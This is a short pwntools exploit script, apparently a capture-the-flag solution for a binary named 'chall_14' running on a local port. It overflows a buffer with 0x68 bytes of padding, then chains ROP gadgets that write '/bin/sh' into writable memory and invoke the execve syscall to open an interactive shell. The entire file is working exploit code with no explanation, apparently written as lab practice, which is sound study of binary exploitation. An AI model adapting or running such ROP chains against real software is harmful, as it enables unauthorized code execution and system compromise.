from pwn import *

target = remote("localhost", 30014)
# target = process("./chall_14")
# gdb.attach(target)

pop_rdi = p64(0x400696)
pop_rax = p64(0x4158f4)
pop_rsi = p64(0x410263)
pop_rbx = p64(0x400d68)
pop_rdx = p64(0x44c0a9)

syscall = p64(0x40120c)

# mov qword ptr [rdx], rax ; ret
write_gadget = p64(0x418627)

rwAddress = p64(0x6b6100)

target.sendline(b"00")

payload = b""
payload += b"0"*0x68

payload += pop_rdx
payload += rwAddress
payload += p64(0x0)
payload += pop_rax
payload += b"/bin/sh\x00"
payload += write_gadget

payload += pop_rax
payload += p64(0x3b)

payload += pop_rdi
payload += rwAddress

payload += pop_rsi
payload += p64(0x0)

payload += pop_rdx
payload += p64(0x0)
payload += p64(0x0)

payload += syscall

target.sendline(payload)

target.interactive()
